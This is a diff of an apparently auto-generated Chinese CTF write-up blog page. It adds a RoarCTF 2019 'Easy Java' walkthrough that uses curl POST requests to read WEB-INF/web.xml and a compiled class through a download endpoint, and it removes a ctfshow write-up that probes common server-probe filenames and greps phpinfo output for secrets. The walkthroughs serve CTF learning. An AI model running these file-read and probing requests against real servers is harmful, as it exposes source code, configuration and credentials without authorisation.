@@ -2259,6 +2259,10 @@
       
         
       
+        
+      
+        
+      
     
     
     
@@ -2414,6 +2418,36 @@
     
   
     JWT
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="category/java/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Java
   
 
     
@@ -3366,6 +3400,36 @@
   
   
     <li class="md-nav__item">
+      <a href="category/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    文件读取
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
       <a href="category/%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A8/" class="md-nav__link">
         
   
@@ -3658,6 +3722,160 @@
 </span></code></pre></div>
 <p>重点不是"这题用了什么 payload"，而是<strong>"我是怎么判断出该用这个的"</strong>。</p>
       </header>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
+          <time datetime="2026-11-24 18:15:00+00:00">2026-11-24</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="category/java/" class="md-meta__link">Java</a>, 
+              <a href="category/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="md-meta__link">文件读取</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 2 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="roarctf-2019-easy-java-web-inf-java-etcpasswd"><a class="toclink" href="roarctf2019-easy-java/">[RoarCTF 2019] Easy Java — WEB-INF 是 Java 的 /etc/passwd</a></h2>
+<blockquote>
+<p><strong>题目类型</strong>：Java 任意文件读取 — 读 <code>WEB-INF</code> 拿源码与 flag</p>
+<p><strong>Flag</strong>：<code>CTF2{a2fddc84-860c-45f0-94ca-f0e41caaa50f}</code></p>
+</blockquote>
+<hr />
+<h3 id="_1"><a class="toclink" href="roarctf2019-easy-java/#_1">题目概述</a></h3>
+<p>题目提示是 Java。<strong>先确认技术栈：DevTools → 存储 → Cookie，看到 <code>JSESSIONID</code>，就坐实了。</strong></p>
+<p><strong>页面右上角有个 <code>help</code>，点下去是一个下载功能。</strong>这就是这道题的入口。</p>
+<hr />
+<h3 id="_2"><a class="toclink" href="roarctf2019-easy-java/#_2">解题过程</a></h3>
+<h4 id="step-1help"><a class="toclink" href="roarctf2019-easy-java/#step-1help">Step 1：help 按钮就是一个文件读取点</a></h4>
+<p><strong>点 help，请求长这样：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>/Download?filename=help.docx
+</span></code></pre></div>
+<p><strong><code>filename</code> 直接当路径用——这就是任意文件读取。</strong></p>
+<h4 id="step-2get-post"><a class="toclink" href="roarctf2019-easy-java/#step-2get-post">Step 2：GET 不行，换 POST</a></h4>
+<p><strong>同样的参数，GET 请求没反应。</strong>换成 POST：</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="n">-X</span> <span class="n">POST</span> <span class="p">-</span><span class="n">-data-urlencode</span> <span class="s2">"filename=/WEB-INF/web.xml"</span> <span class="s2">"http://目标/Download"</span>
+</span></code></pre></div>
+<p><strong>这次出来了。</strong></p>
+<p><strong>原因是 <code>DownloadController</code> 只处理 POST 请求（<code>doPost</code>），<code>doGet</code> 没实现。</strong>所以这个点看着像 GET 接口，其实只认 POST。</p>
+<h4 id="step-3-webxml-servlet"><a class="toclink" href="roarctf2019-easy-java/#step-3-webxml-servlet">Step 3：读 web.xml，找到真正干活的 Servlet</a></h4>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nt">&lt;servlet&gt;</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="w">    </span><span class="nt">&lt;servlet-name&gt;</span>FlagController<span class="nt">&lt;/servlet-name&gt;</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="w">    </span><span class="nt">&lt;servlet-class&gt;</span>com.wm.ctf.FlagController<span class="nt">&lt;/servlet-class&gt;</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="nt">&lt;/servlet&gt;</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="nt">&lt;servlet-mapping&gt;</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="w">    </span><span class="nt">&lt;servlet-name&gt;</span>FlagController<span class="nt">&lt;/servlet-name&gt;</span>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="w">    </span><span class="nt">&lt;url-pattern&gt;</span>/Flag<span class="nt">&lt;/url-pattern&gt;</span>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="nt">&lt;/servlet-mapping&gt;</span>
+</span></code></pre></div>
+<p><strong>两个信息：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>FlagController    在 com.wm.ctf 包里
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>映射到 /Flag       ——但它不直接给你 flag
+</span></code></pre></div>
+<p><strong>flag 写在 <code>FlagController.class</code> 里。</strong></p>
+<h4 id="step-4-class"><a class="toclink" href="roarctf2019-easy-java/#step-4-class">Step 4：读 class 文件——路径别加前缀</a></h4>
+<p><strong>这里有个坑，我踩了一次。</strong></p>
+<p><strong>Download 的参数是相对 <code>WEB-INF/classes/</code> 的</strong>（servlet 里是 <code>getResourceAsStream("/WEB-INF/classes/" + filename)</code>）。<strong>所以：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>✗ WEB-INF/classes/com/wm/ctf/FlagController.class     ← 重复了前缀，读不到
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>✓ com/wm/ctf/FlagController.class                      ← 对
+</span></code></pre></div>
+<p><strong>我第一次写的是前者，结果没有任何回显——不是文件不存在，是路径拼出来变成了 <code>/WEB-INF/classes/WEB-INF/classes/...</code>。</strong></p>
+<p><strong>正确请求：</strong></p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="n">-X</span> <span class="n">POST</span> <span class="p">-</span><span class="n">-data-urlencode</span> <span class="s2">"filename=com/wm/ctf/FlagController.class"</span> <span class="s2">"http://目标/Download"</span> <span class="n">-o</span> <span class="n">flag</span><span class="p">.</span><span class="n">class</span>
+</span></code></pre></div>
+<h4 id="step-5class"><a class="toclink" href="roarctf2019-easy-java/#step-5class">Step 5：class 是二进制，要搜里面的明文</a></h4>
+<p><strong><code>.class</code> 是编译后的字节码，直接在终端里看是一堆乱码。</strong>保存成文件后用编辑器打开，<strong>在可读区里能看到一段 base64。</strong></p>
+<p><strong>Notepad++ 打开，<code>Ctrl+F</code> 搜 <code>flag</code> 或直接搜 <code>=</code>（base64 结尾常见）：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>ZmxhZ3thMmZkZGM4NC04NjBjLTQ1ZjAtOTRjYS1mMGU0MWNhYWE1MGZ9
+</span></code></pre></div>
+<p><strong>解码：</strong></p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="n">python</span> <span class="n">-c</span> <span class="s2">"import base64;print(base64.b64decode('ZmxhZ3thMmZkZGM4NC04NjBjLTQ1ZjAtOTRjYS1mMGU0MWNhYWE1MGZ9').decode())"</span>
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>CTF2{a2fddc84-860c-45f0-94ca-f0e41caaa50f}
+</span></code></pre></div>
+<hr />
+<table>
+<thead>
+<tr>
+<th>关键点</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>判技术栈</td>
+<td>Cookie 里有 <code>JSESSIONID</code> → Java</td>
+</tr>
+<tr>
+<td>入口</td>
+<td><code>help</code> → <code>/Download?filename=...</code></td>
+</tr>
+<tr>
+<td>请求方式</td>
+<td><strong>必须 POST</strong>，GET 不处理</td>
+</tr>
+<tr>
+<td>必读文件</td>
+<td><code>/WEB-INF/web.xml</code>（Servlet 映射全在里面）</td>
+</tr>
+<tr>
+<td>路径基准</td>
+<td><code>filename</code> 相对 <code>WEB-INF/classes/</code>，别再写这段前缀</td>
+</tr>
+<tr>
+<td>class 文件</td>
+<td>二进制，用编辑器/<code>strings</code> 搜 base64 明文</td>
+</tr>
+<tr>
+<td>类比</td>
+<td><code>/WEB-INF</code> 在 Java 里约等于 Linux 的 <code>/etc/passwd</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<details class="note">
+<summary>完整请求</summary>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c"># ① 先看 web.xml</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="n">-X</span> <span class="n">POST</span> <span class="p">-</span><span class="n">-data-urlencode</span> <span class="s2">"filename=/WEB-INF/web.xml"</span> <span class="s2">"http://目标/Download"</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="c"># ② 读业务类（注意不要带 WEB-INF/classes 前缀）</span>
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="n">-X</span> <span class="n">POST</span> <span class="p">-</span><span class="n">-data-urlencode</span> <span class="s2">"filename=com/wm/ctf/FlagController.class"</span> <span class="s2">"http://目标/Download"</span> <span class="n">-o</span> <span class="n">flag</span><span class="p">.</span><span class="n">class</span>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="c"># ③ 搜 base64 并解码</span>
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="c"># Notepad++ 打开 flag.class，Ctrl+F 搜 ZmxhZ 或 "="</span>
+</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a><span class="n">python</span> <span class="n">-c</span> <span class="s2">"import base64;print(base64.b64decode('ZmxhZ3thMmZkZGM4NC04NjBjLTQ1ZjAtOTRjYS1mMGU0MWNhYWE1MGZ9').decode())"</span>
+</span></code></pre></div>
+</details>
+<details class="note">
+<summary>这题踩的坑</summary>
+<p><strong>① 路径加了 <code>WEB-INF/classes/</code></strong></p>
+<p><strong>源码里已经帮你拼了 <code>"/WEB-INF/classes/"</code></strong>，你再写一遍就变成双层路径，<strong>表现是“没有任何回显”，很容易误判成文件不存在。</strong></p>
+<p><strong>② 用 GET 试</strong></p>
+<p><code>doGet</code> 没实现，所以 GET 一定空。<strong>看到“参数对但没反应”，先换请求方法，再怀疑路径。</strong></p>
+<p><strong>③ 直接看终端的 class 输出</strong></p>
+<p><strong>二进制里有不可见字符，终端会把内容吃掉或显示成乱码。</strong>一定要 <code>-o</code> 存成文件，用编辑器/<code>strings</code> 看。</p>
+<p><strong>④ 只记 <code>/WEB-INF/web.xml</code></strong></p>
+<p><strong><code>web.xml</code> 只告诉你有哪些 Servlet；真正的 flag 在对应的 <code>.class</code> 里。</strong>这是两步，不是一步。</p>
+</details>
+    
+    
+  </div>
+</article>
       
         <article class="md-post md-post--excerpt">
   <header class="md-post__header">
@@ -5368,149 +5586,6 @@
 <p>PHP 的 <code>php://filter</code> 在 Java 里当然报错。<strong>报错本身就是信息</strong>——它告诉你该换哪一套思路。</p>
 <p><strong>④ 改了 XML 结构</strong></p>
 <p>服务器的模板要求特定标签（<code>&lt;题名&gt;</code>、<code>&lt;句&gt;</code>），<strong>结构改坏就走不到回显那一步</strong>，哪怕实体读到了也没用。</p>
-</details>
-    
-    
-  </div>
-</article>
-      
-        <article class="md-post md-post--excerpt">
-  <header class="md-post__header">
-    
-    <div class="md-post__meta md-meta">
-      <ul class="md-meta__list">
-        <li class="md-meta__item">
-          <time datetime="2026-11-19 16:20:00+00:00">2026-11-19</time></li>
-        
-          <li class="md-meta__item">
-            分类于
-            
-              <a href="category/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="md-meta__link">信息收集</a>, 
-              <a href="category/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/" class="md-meta__link">源码泄露</a></li>
-        
-        
-          
-          <li class="md-meta__item">
-            
-              需要 2 分钟阅读时间
-            
-          </li>
-        
-        
-      </ul>
-      
-    </div>
-  </header>
-  <div class="md-post__content md-typeset">
-    <h2 id="ctfshow-tzphp"><a class="toclink" href="ctfshow-probe-leak/">ctfshow — 探针泄露：一个 tz.php 把整台机器摊在页面上</a></h2>
-<blockquote>
-<p><strong>题目类型</strong>：信息收集 — 服务器探针（phpinfo）泄露环境信息</p>
-<p><strong>Flag</strong>：<code>ctfshow{b331ef56-d57c-4486-a229-0fa42200b6bf}</code></p>
-</blockquote>
-<hr />
-<h3 id="_1"><a class="toclink" href="ctfshow-probe-leak/#_1">题目概述</a></h3>
-<p>进去是个普通页面，看不出东西。<strong>这题考的不是漏洞，是“服务器上不该存在的文件”。</strong></p>
-<p><strong>服务器探针</strong>是运维用来排查环境的小工具（PHP 版本、扩展、路径、环境变量全列出来）。<strong>忘了删，就等于把机器的体检报告挂在公网上。</strong></p>
-<hr />
-<h3 id="_2"><a class="toclink" href="ctfshow-probe-leak/#_2">解题过程</a></h3>
-<h4 id="step-1"><a class="toclink" href="ctfshow-probe-leak/#step-1">Step 1：先猜探针文件名</a></h4>
-<p><strong>探针文件名没有标准，但圈内有几个“约定俗成”的：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>tz.php        ← 这题用的（雅黑探针系列）
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>y.php
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>i.php
-</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>l.php
-</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>p.php
-</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>x.php
-</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>info.php
-</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>phpinfo.php
-</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>test.php
-</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>1.php
-</span></code></pre></div>
-<p><strong>为什么是这几个：</strong>探针类工具（雅黑探针、iProber 等）默认文件名就是这些短名，很多人下载后直接丢到根目录不改名。</p>
-<p><strong>扫目录时把 <code>php</code> 后缀配上这几个单词；实在扫不出来，也可以手工挨个试——都是 GET，成本很低。</strong></p>
-<h4 id="step-2-phpinfo"><a class="toclink" href="ctfshow-probe-leak/#step-2-phpinfo">Step 2：探针页面 → 点 phpinfo</a></h4>
-<p><strong>访问 <code>tz.php</code>，会看到一个功能页，上面有服务器信息汇总，还有几个链接，其中一个就是 <code>phpinfo()</code>。</strong></p>
-<p><strong>点进去之后，页面变成一大坨信息：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>PHP Version         7.3.11
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>System              Linux ...
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>Server API          FPM/FastCGI
-</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>Loaded Configuration File
-</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>Environment          ← 重点
-</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>PHP Variables        ← 重点
-</span></code></pre></div>
-<p><strong><code>phpinfo()</code> 会把当前进程的</strong>环境变量<strong>整段打印出来。</strong></p>
-<p><strong>而很多部署方式（Docker、docker-compose、K8s）会把 flag 作为环境变量注入容器——因为写进文件容易被镜像带上，放环境变量“看起来安全”。</strong></p>
-<h4 id="step-3-flag"><a class="toclink" href="ctfshow-probe-leak/#step-3-flag">Step 3：在页面里找 flag</a></h4>
-<p><strong>phpinfo 页面非常长，靠肉眼翻基本翻不到。用浏览器搜索：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>Ctrl + F  →  输入 flag  →  回车
-</span></code></pre></div>
-<p><strong>命中之后会高亮，直接看右边那一列的值：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>FLAG    ctfshow{b331ef56-d57c-4486-a229-0fa42200b6bf}
-</span></code></pre></div>
-<p><strong>如果是命令行，就更省事：</strong></p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="n">-k</span> <span class="s2">"https://目标/tz.php"</span> <span class="p">|</span> <span class="nb">Select-String</span> <span class="n">-Pattern</span> <span class="s2">"flag"</span>
-</span></code></pre></div>
-<p><strong>或者直接抓 phpinfo 输出并过滤：</strong></p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="n">-k</span> <span class="s2">"https://目标/phpinfo.php"</span> <span class="p">|</span> <span class="nb">Select-String</span> <span class="n">-Pattern</span> <span class="s2">"FLAG"</span>
-</span></code></pre></div>
-<hr />
-<table>
-<thead>
-<tr>
-<th>关键点</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>探针</td>
-<td>运维排查用的小工具，暴露版本/路径/扩展/环境变量</td>
-</tr>
-<tr>
-<td>常见文件名</td>
-<td><code>tz.php</code>、<code>y.php</code>、<code>i.php</code>、<code>info.php</code>、<code>phpinfo.php</code>、<code>1.php</code></td>
-</tr>
-<tr>
-<td>phpinfo 的价值</td>
-<td><code>Environment</code> 区块包含进程环境变量</td>
-</tr>
-<tr>
-<td>为什么 flag 在环境变量</td>
-<td>容器部署时常把敏感值放 env，避免写进镜像文件</td>
-</tr>
-<tr>
-<td>怎么快速定位</td>
-<td>浏览器 <code>Ctrl+F</code> 搜 <code>flag</code>，或 <code>curl \| Select-String</code></td>
-</tr>
-<tr>
-<td>这类文件为什么危险</td>
-<td>除了 flag，还可能泄露数据库账号、内部路径、AK/SK</td>
-</tr>
-</tbody>
-</table>
-<hr />
-<details class="note">
-<summary>命令行一把梭</summary>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c"># 先找探针</span>
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="k">foreach</span> <span class="p">(</span><span class="nv">$p</span> <span class="k">in</span> <span class="s2">"tz.php"</span><span class="p">,</span><span class="s2">"y.php"</span><span class="p">,</span><span class="s2">"i.php"</span><span class="p">,</span><span class="s2">"info.php"</span><span class="p">,</span><span class="s2">"phpinfo.php"</span><span class="p">,</span><span class="s2">"1.php"</span><span class="p">)</span> <span class="p">{</span>
-</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>  <span class="nv">$code</span> <span class="p">=</span> <span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="n">-o</span> <span class="n">NUL</span> <span class="n">-w</span> <span class="s2">"%{http_code}"</span> <span class="n">-k</span> <span class="s2">"https://目标/$p"</span>
-</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>  <span class="k">if</span> <span class="p">(</span><span class="nv">$code</span> <span class="o">-eq</span> <span class="s2">"200"</span><span class="p">)</span> <span class="p">{</span> <span class="nb">Write-Output</span> <span class="s2">"$p 存在"</span> <span class="p">}</span>
-</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="p">}</span>
-</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>
-</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="c"># 再搜 flag</span>
-</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="n">-k</span> <span class="s2">"https://目标/tz.php"</span> <span class="p">|</span> <span class="nb">Select-String</span> <span class="s2">"flag"</span>
-</span></code></pre></div>
-</details>
-<details class="note">
-<summary>这题踩的坑</summary>
-<p><strong>① 只看首页</strong></p>
-<p>探针不在首页链接里，得自己敲路径。<strong>这类题的关键动作是“猜文件名”，不是“看页面”。</strong></p>
-<p><strong>② 进了探针页就停住</strong></p>
-<p>探针页只是汇总，<strong>真正有 env 的是它里面的 <code>phpinfo()</code> 子页面</strong>，还得再点一次。</p>
-<p><strong>③ 肉眼翻 phpinfo</strong></p>
-<p>页面几千行，翻不到很正常。<strong><code>Ctrl+F</code> 搜 <code>flag</code> 是最快的，其次是 <code>Select-String</code>。</strong></p>
-<p><strong>④ 只搜“环境变量”一个区块</strong></p>
-<p>有些题把 flag 放在 <code>PHP Variables</code> 或 <code>$_SERVER</code> 里。<strong>搜关键字比找区块快。</strong></p>
 </details>
     
     
